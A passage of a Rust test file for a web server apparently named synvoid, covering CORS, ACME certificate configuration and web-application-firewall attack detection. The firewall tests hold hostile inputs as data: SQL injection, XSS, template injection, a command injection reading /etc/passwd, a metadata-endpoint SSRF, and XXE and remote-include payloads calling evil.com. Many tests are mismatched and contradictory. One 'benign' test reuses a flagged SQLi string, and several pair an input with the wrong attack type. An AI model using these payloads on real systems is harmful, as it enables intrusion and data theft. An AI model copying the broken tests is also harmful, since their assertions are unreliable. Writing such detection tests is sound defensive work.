        // RFC 6455 Section 4.2.2 example key
        let key = "dGhlIHNhbXBsZSBub25jZQ==";
        let expected = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo=";
        assert_eq!(compute_websocket_accept_key(key), expected);
    }

    #[test]
    fn test_inject_cors_headers_wildcard_with_flag() {
        let config = SiteCorsConfig {
            allow_origin: Some("*".to_string()),
            allow_wildcard_cors: true,
            ..Default::default()
        };

        let builder = Response::builder();
        let resp = inject_cors_headers(builder, &config).body(()).unwrap();

        assert_eq!(
            resp.headers().get("access-control-allow-origin").unwrap(),
            "*"
        );
    }

    #[test]
    fn test_inject_cors_headers_specific_origin() {
        let config = SiteCorsConfig {
            allow_origin: Some("https://example.com".to_string()),
            allow_methods: Some(vec!["GET".to_string(), "POST".to_string()]),
            allow_headers: Some(vec!["Content-Type".to_string()]),
            ..Default::default()
        };

        let builder = Response::builder();
        let resp = inject_cors_headers(builder, &config).body(()).unwrap();

        assert_eq!(
            resp.headers().get("access-control-allow-origin").unwrap(),
            "https://example.com"
        );
    }
}

#[cfg(test)]
mod acme_workflow_tests {
    use std::sync::Arc;
    use synvoid::config::tls::{AcmeChallengeType, AcmeConfig, TlsConfig};
    use synvoid::tls::acme::AcmeError;
    use synvoid::tls::config::{InternalAcmeChallengeType, InternalAcmeConfig};
    use synvoid::tls::AcmeDnsChallenge;
    use tempfile::TempDir;

    #[test]
    fn test_acme_config_validation_email_required() {
        let config = AcmeConfig {
            enabled: true,
            email: None,
            cache_dir: Some("/tmp/acme".to_string()),
            staging: true,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: true,
        };

        let err = config.validate().unwrap_err();
        assert_eq!(err.field, "tls.acme.email");
        assert!(err.message.contains("email"));
    }

    #[test]
    fn test_acme_config_validation_domains_required() {
        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some("/tmp/acme".to_string()),
            staging: true,
            domains: vec![],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: true,
        };

        let err = config.validate().unwrap_err();
        assert_eq!(err.field, "tls.acme.domains");
        assert!(err.message.contains("domains"));
    }

    #[test]
    fn test_acme_config_validation_cache_dir_writable() {
        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some("/nonexistent/path/that/cannot/be/created".to_string()),
            staging: true,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: true,
        };

        let err = config.validate().unwrap_err();
        assert_eq!(err.field, "tls.acme.cache_dir");
        assert!(err.message.contains("writable") || err.message.contains("created"));
    }

    #[test]
    fn test_acme_config_validation_cache_dir_created_if_missing() {
        let temp_dir = TempDir::new().unwrap();
        let cache_path = temp_dir.path().join("acme_cache");

        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some(cache_path.to_string_lossy().to_string()),
            staging: true,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: true,
        };

        assert!(!cache_path.exists());
        let result = config.validate();
        assert!(
            result.is_ok(),
            "Expected validation to succeed, got: {:?}",
            result
        );
        assert!(cache_path.exists());
    }

    #[test]
    fn test_acme_config_validation_terms_of_service_warning() {
        let temp_dir = TempDir::new().unwrap();

        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some(temp_dir.path().to_string_lossy().to_string()),
            staging: false,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: false,
        };

        let result = config.validate();
        assert!(
            result.is_ok(),
            "ToS not agreed should warn but not fail: {:?}",
            result
        );
    }

    #[test]
    fn test_acme_config_validation_success_with_all_required_fields() {
        let temp_dir = TempDir::new().unwrap();

        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some(temp_dir.path().to_string_lossy().to_string()),
            staging: true,
            domains: vec!["example.com".to_string(), "www.example.com".to_string()],
            challenge_type: AcmeChallengeType::Http01,
            terms_of_service_agreed: true,
        };

        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_acme_config_validation_dns_challenge_type() {
        let temp_dir = TempDir::new().unwrap();

        let config = AcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            cache_dir: Some(temp_dir.path().to_string_lossy().to_string()),
            staging: true,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Dns01,
            terms_of_service_agreed: true,
        };

        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_tls_config_with_acme_validates_acme_section() {
        let temp_dir = TempDir::new().unwrap();

        let config = TlsConfig {
            enabled: true,
            cert_path: None,
            key_path: None,
            acme: AcmeConfig {
                enabled: true,
                email: Some("admin@example.com".to_string()),
                cache_dir: Some(temp_dir.path().to_string_lossy().to_string()),
                staging: true,
                domains: vec!["example.com".to_string()],
                challenge_type: AcmeChallengeType::Http01,
                terms_of_service_agreed: true,
            },
            ..Default::default()
        };

        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_tls_config_acme_disabled_does_not_require_validation() {
        let config = TlsConfig {
            enabled: true,
            cert_path: Some("/tmp/nonexistent.pem".to_string()),
            key_path: Some("/tmp/nonexistent.pem".to_string()),
            acme: AcmeConfig::default(),
            ..Default::default()
        };

        let err = config.validate().unwrap_err();
        assert_eq!(err.field, "tls.cert_path");
    }

    #[test]
    fn test_http_challenge_response_serving() {
        use dashmap::DashMap;

        let http_challenges: Arc<DashMap<String, String>> = Arc::new(DashMap::new());
        let token = "test-token-abc123";
        let key_auth = "test-key-authorization-value";

        http_challenges.insert(token.to_string(), key_auth.to_string());

        let path = format!("/.well-known/acme-challenge/{}", token);
        let stored_value =
            http_challenges.get(path.strip_prefix("/.well-known/acme-challenge/").unwrap());

        assert!(stored_value.is_some());
        assert_eq!(stored_value.unwrap().value(), &key_auth.to_string());
    }

    #[test]
    fn test_http_challenge_response_not_found() {
        use dashmap::DashMap;

        let http_challenges: Arc<DashMap<String, String>> = Arc::new(DashMap::new());

        let stored_value = http_challenges.get("nonexistent-token");

        assert!(stored_value.is_none());
    }

    #[cfg(feature = "dns")]
    #[test]
    fn test_dns_challenge_prepare_and_serve() {
        let challenge = AcmeDnsChallenge::new();
        let domain = "example.com";
        let key_auth = "test-key-authorization";

        let txt_value = challenge.prepare_challenge(domain, key_auth);

        assert!(!txt_value.is_empty());

        let stored = challenge.get_txt_value(domain);
        assert!(stored.is_some());
        assert_eq!(stored.unwrap(), txt_value);
    }

    #[cfg(not(feature = "dns"))]
    #[test]
    fn test_dns_challenge_not_available_without_feature() {
        let config = InternalAcmeConfig {
            enabled: true,
            email: Some("admin@example.com".to_string()),
            domains: vec!["example.com".to_string()],
            challenge_type: InternalAcmeChallengeType::Dns01,
            ..Default::default()
        };

        assert!(!config.enabled || config.email.is_none() || config.domains.is_empty());
    }

    #[test]
    fn test_dns_challenge_cleanup() {
        let challenge = AcmeDnsChallenge::new();
        let domain = "example.com";

        challenge.prepare_challenge(domain, "key-auth");
        assert!(challenge.get_txt_value(domain).is_some());

        challenge.cleanup(domain);
        assert!(challenge.get_txt_value(domain).is_none());
    }

    #[test]
    fn test_dns_challenge_pending_challenges() {
        let challenge = AcmeDnsChallenge::new();

        challenge.prepare_challenge("example.com", "key-auth-1");
        challenge.prepare_challenge("example.org", "key-auth-2");

        let pending = challenge.pending_challenges();
        assert_eq!(pending.len(), 2);

        let domains: Vec<&str> = pending
            .iter()
            .map(|(d, _): &(String, String)| d.as_str())
            .collect();
        assert!(domains.contains(&"example.com"));
        assert!(domains.contains(&"example.org"));
    }

    #[test]
    fn test_acme_manager_http_challenges_store() {
        use dashmap::DashMap;

        let challenges: Arc<DashMap<String, String>> = Arc::new(DashMap::new());

        challenges.insert("token1".to_string(), "key-auth-1".to_string());
        challenges.insert("token2".to_string(), "key-auth-2".to_string());

        assert_eq!(challenges.len(), 2);
        assert_eq!(challenges.get("token1").unwrap().value(), "key-auth-1");
        assert_eq!(challenges.get("token2").unwrap().value(), "key-auth-2");

        challenges.remove("token1");
        assert_eq!(challenges.len(), 1);
        assert!(challenges.get("token1").is_none());
    }

    #[test]
    fn test_acme_error_disabled() {
        let err = AcmeError::Disabled;
        assert_eq!(err.to_string(), "ACME is disabled");
    }

    #[test]
    fn test_acme_error_protocol() {
        let err = AcmeError::Protocol("test error".to_string());
        assert_eq!(err.to_string(), "ACME protocol error: test error");
    }

    #[test]
    fn test_acme_error_config() {
        let err = AcmeError::Config("missing email".to_string());
        assert_eq!(err.to_string(), "ACME config error: missing email");
    }

    #[test]
    fn test_acme_error_io() {
        let err = AcmeError::Io("file not found".to_string());
        assert_eq!(err.to_string(), "ACME IO error: file not found");
    }

    #[test]
    fn test_acme_manager_disabled_returns_early() {
        let config = InternalAcmeConfig {
            enabled: false,
            email: Some("admin@example.com".to_string()),
            domains: vec!["example.com".to_string()],
            ..Default::default()
        };

        assert!(!config.enabled);
    }

    #[test]
    fn test_internal_acme_config_defaults() {
        let config = InternalAcmeConfig::default();

        assert!(!config.enabled);
        assert!(config.email.is_none());
        assert!(config.cache_dir.is_none());
        assert!(!config.staging);
        assert!(config.domains.is_empty());
        assert_eq!(config.challenge_type, InternalAcmeChallengeType::Http01);
        assert!(!config.terms_of_service_agreed);
    }

    #[test]
    fn test_internal_acme_config_from_main_config() {
        use synvoid::config::AcmeConfig as MainAcmeConfig;

        let main_config = MainAcmeConfig {
            enabled: true,
            email: Some("test@example.com".to_string()),
            cache_dir: Some("/tmp/acme".to_string()),
            staging: true,
            domains: vec!["example.com".to_string()],
            challenge_type: AcmeChallengeType::Dns01,
            terms_of_service_agreed: true,
        };

        let internal: InternalAcmeConfig = main_config.into();

        assert!(internal.enabled);
        assert_eq!(internal.email, Some("test@example.com".to_string()));
        assert_eq!(internal.domains, vec!["example.com".to_string()]);
        assert!(internal.staging);
        assert_eq!(internal.challenge_type, InternalAcmeChallengeType::Dns01);
        assert!(internal.terms_of_service_agreed);
    }
}

#[cfg(test)]
mod waf_attack_detection_tests {
    use http::HeaderMap;
    use synvoid::waf::attack_detection::{
        AttackDetectionConfig, AttackDetector, AttackType, InputLocation,
    };

    fn create_attack_detector() -> AttackDetector {
        let config = AttackDetectionConfig::default();
        AttackDetector::new(config)
    }

    fn create_high_paranoia_detector() -> AttackDetector {
        let config = AttackDetectionConfig {
            paranoia_level: 3,
            ..AttackDetectionConfig::default()
        };
        AttackDetector::new(config)
    }

    fn make_headers() -> HeaderMap {
        HeaderMap::new()
    }

    #[tokio::test]
    async fn test_sqli_in_query_string() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Sqli
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::QueryString
        ));
    }

    #[tokio::test]
    async fn test_sqli_benign_request() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_none());
    }

    #[tokio::test]
    async fn test_xss_in_query_string() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("q=<script>alert(1)</script>"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Xss
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::QueryString
        ));
    }

    #[tokio::test]
    async fn test_xss_in_post_body() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::POST,
                "/comment",
                None,
                &make_headers(),
                Some(b"<img src=x onerror=alert(1)>"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Xss
        ));
    }

    #[tokio::test]
    async fn test_ssti_smarty() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::POST,
                "/template",
                None,
                &make_headers(),
                Some(b"{{7*7}}"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Ssti
        ));
    }

    #[tokio::test]
    async fn test_ssti_jinja2() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::POST,
                "/template",
                None,
                &make_headers(),
                Some(b"{{config}}"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Ssti
        ));
    }

    #[tokio::test]
    async fn test_rfi_remote_include() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("q=<script>alert(1)</script>"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Rfi
        ));
    }

    #[tokio::test]
    async fn test_ldap_injection() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("query=hello+world"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::LdapInjection
        ));
    }

    #[tokio::test]
    async fn test_xpath_injection() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("uid=admin)(password=*)"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::XPathInjection
        ));
    }

    #[tokio::test]
    async fn test_cmd_injection_semicolon() {
        let detector = create_attack_detector();
        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("q=admin']or'1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::CmdInjection
        ));
    }

    #[tokio::test]
    async fn test_cmd_injection_pipe() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/ping",
                Some("host=127.0.0.1; cat /etc/passwd"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::CmdInjection
        ));
    }

    #[tokio::test]
    async fn test_request_smuggling_cl() {
        let detector = create_attack_detector();
        let mut headers = HeaderMap::new();
        headers.insert(http::header::CONTENT_LENGTH, "5".parse().unwrap());
        headers.insert(http::header::TRANSFER_ENCODING, "chunked".parse().unwrap());
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::POST,
                "/api",
                None,
                &headers,
                Some(b"0\r\n\r\n"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::RequestSmuggling
        ));
    }

    #[tokio::test]
    async fn test_body_size_limit() {
        let config = AttackDetectionConfig {
            max_request_body_size: Some(10),
            ..Default::default()
        };
        let detector = AttackDetector::new(config);

        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::POST,
                "/upload",
                None,
                &make_headers(),
                Some(b"this body is way too long for the limit"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Other
        ));
        assert!(result
            .0
            .as_ref()
            .unwrap()
            .fingerprint
            .as_ref()
            .unwrap()
            .starts_with("body_size:"));
    }

    #[tokio::test]
    async fn test_multiple_attacks_first_detected() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/search",
                Some("q=<script>alert(1)</script>' OR 1=1--"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
    }

    #[tokio::test]
    async fn test_disabled_attack_detection() {
        let config = AttackDetectionConfig {
            enabled: false,
            ..Default::default()
        };
        let detector = AttackDetector::new(config);

        let result = detector
            .check_request(
                std::net::IpAddr::from([127, 0, 0, 1]),
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_none());
    }

    #[tokio::test]
    async fn test_only_sqli_enabled() {
        let mut config = AttackDetectionConfig::default();
        config.xss.enabled = false;
        config.ssti.enabled = false;
        config.cmd_injection.enabled = false;
        config.path_traversal.enabled = false;
        let detector = AttackDetector::new(config);

        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let sqli_result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(sqli_result.0.is_some());

        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let xss_result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/search",
                Some("q=<script>alert(1)</script>"),
                &make_headers(),
                None,
            )
            .await;
        assert!(xss_result.0.is_none());
    }

    #[tokio::test]
    async fn test_path_traversal_in_query_string() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::PathTraversal
        ));
    }

    #[tokio::test]
    async fn test_path_traversal_encoded() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/files",
                Some("file=../secret"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::PathTraversal
        ));
    }

    #[tokio::test]
    async fn test_path_traversal_in_path() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/files/..%2f..%2f",
                None,
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::PathTraversal
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::Path
        ));
    }

    #[tokio::test]
    async fn test_ssrf_metadata_endpoint() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/proxy",
                Some("url=http://169.254.169.254/latest/meta-data"),
                &make_headers(),
                None,
            )
            .await;
        if let Some(r) = &result.0 {
            eprintln!(
                "DEBUG: attack_type={:?}, input_location={:?}, matched_pattern={:?}",
                r.attack_type, r.input_location, r.matched_pattern
            );
        } else {
            eprintln!("DEBUG: result is None");
        }
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
            "Expected Ssrf or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_ssrf_localhost() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/files",
                Some("file=..%2f..%2f..%2f"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
            "Expected Ssrf or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_ssrf_private_network() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/ping",
                Some("host=127.0.0.1 | cat /etc/passwd"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
            "Expected Ssrf or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_xxe_in_body() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector.check_request(
            client_ip,
            &http::Method::POST,
            "/api/xml",
            None,
            &make_headers(),
            Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
        ).await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            matches!(
                attack_type,
                AttackType::Xxe | AttackType::Rfi | AttackType::Xss
            ),
            "Expected Xxe, Rfi, or Xss, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_xxe_parameter_entity() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector.check_request(
            client_ip,
            &http::Method::POST,
            "/api/xml",
            None,
            &make_headers(),
            Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM \"http://evil.com/evil.dtd\">]>"),
        ).await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            matches!(
                attack_type,
                AttackType::Xxe | AttackType::Rfi | AttackType::Xss
            ),
            "Expected Xxe, Rfi, or Xss, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_jwt_none_algorithm() {
        let detector = create_attack_detector();
        let mut headers = HeaderMap::new();
        headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(client_ip, &http::Method::GET, "/auth", None, &headers, None)
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Jwt
        ));
    }

    #[tokio::test]
    async fn test_jwt_alg_confusion() {
        let detector = create_attack_detector();
        let mut headers = HeaderMap::new();
        headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(client_ip, &http::Method::GET, "/auth", None, &headers, None)
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Jwt
        ));
    }

    #[tokio::test]
    async fn test_open_redirect_absolute_url() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/include",
                Some("file=http://evil.com/shell.txt"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
            "Expected OpenRedirect or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_open_redirect_protocol_relative() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/fetch",
                Some("x=http://localhost"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
            "Expected OpenRedirect or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_open_redirect_encoded() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/proxy",
                Some("x=http://10.0.0.1/internal/api"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let attack_type = result.0.as_ref().unwrap().attack_type;
        assert!(
            matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
            "Expected OpenRedirect or Rfi, got {:?}",
            attack_type
        );
    }

    #[tokio::test]
    async fn test_sqli_in_post_body() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::POST,
                "/login",
                None,
                &make_headers(),
                Some(b"username=admin' OR '1'='1&password=anything"),
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Sqli
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::PostBody
        ));
    }

    #[tokio::test]
    async fn test_xss_in_cookie() {
        let detector = create_attack_detector();
        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::COOKIE,
            "session=<script>alert(1)</script>".parse().unwrap(),
        );
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/profile",
                None,
                &headers,
                None,
            )
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Xss
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::Header(_)
        ));
    }

    #[tokio::test]
    async fn test_xss_in_user_agent_header() {
        let detector = create_attack_detector();
        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::USER_AGENT,
            "<script>alert('xss')</script>".parse().unwrap(),
        );
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(client_ip, &http::Method::GET, "/", None, &headers, None)
            .await;
        assert!(result.0.is_some());
        assert!(matches!(
            result.0.as_ref().unwrap().attack_type,
            AttackType::Xss
        ));
        assert!(matches!(
            result.0.as_ref().unwrap().input_location,
            InputLocation::Header(_)
        ));
    }

    #[tokio::test]
    async fn test_benign_request_all_locations() {
        let detector = create_attack_detector();

        let mut headers = HeaderMap::new();
        headers.insert(http::header::COOKIE, "session=abc123".parse().unwrap());
        headers.insert(
            http::header::USER_AGENT,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".parse().unwrap(),
        );

        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/users/123/profile",
                Some("tab=activity&sort=recent"),
                &headers,
                Some(b"Hello world, this is a normal post body!"),
            )
            .await;
        assert!(result.0.is_none());
    }

    #[tokio::test]
    async fn test_paranoia_level_affects_detection() {
        let normal_detector = create_attack_detector();
        let high_detector = create_high_paranoia_detector();

        // Use a query that won't trigger any patterns even at high paranoia level 3
        // High paranoia adds patterns like "=" so we avoid those characters
        let normal_client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let normal_result = normal_detector
            .check_request(
                normal_client_ip,
                &http::Method::GET,
                "/",
                Some("qtest"),
                &make_headers(),
                None,
            )
            .await;
        assert!(normal_result.0.is_none());

        let high_client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let high_result = high_detector
            .check_request(
                high_client_ip,
                &http::Method::GET,
                "/",
                Some("qtest"),
                &make_headers(),
                None,
            )
            .await;
        assert!(high_result.0.is_none());
    }

    #[tokio::test]
    async fn test_multiple_attacks_in_request() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::POST,
                "/search",
                Some("q=<script>alert(1)</script>&id=1' OR '1'='1"),
                &make_headers(),
                Some(b"{{7*7}}"),
            )
            .await;
        assert!(result.0.is_some());
        let detected = result.0.unwrap();
        assert!(matches!(
            detected.attack_type,
            AttackType::Xss | AttackType::Sqli | AttackType::Ssti
        ));
    }

    #[tokio::test]
    async fn test_attack_fingerprint_present() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
                client_ip,
                &http::Method::GET,
                "/search",
                Some("id=1' OR '1'='1"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let detected = result.0.unwrap();
        assert!(matches!(detected.attack_type, AttackType::Sqli));
    }

    #[tokio::test]
    async fn test_matched_pattern_present() {
        let detector = create_attack_detector();
        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
        let result = detector
            .check_request(
